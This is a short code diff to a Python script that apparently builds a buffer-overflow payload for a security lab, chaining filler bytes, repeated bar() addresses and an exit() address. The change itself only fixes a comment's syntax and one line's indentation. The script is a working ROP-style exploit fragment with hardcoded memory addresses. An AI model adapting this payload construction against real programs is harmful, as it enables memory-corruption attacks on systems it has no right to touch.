@@ -8,9 +8,9 @@ bar_addr   = 0x08048567  # Address of bar()
 exit_addr  = 0xb7e369d0  # Address of exit()
 
 content = bytearray(0xaa for i in range(112))
-content += tobytes(0xFFFFFFFF)  // This value is not important here.
+content += tobytes(0xFFFFFFFF)  # This value is not important here.
 for i in range(10):           
-  content += tobytes(bar_addr)
+   content += tobytes(bar_addr)
 
 # Invoke exit() to exit gracefully at the end
 content += tobytes(exit_addr)
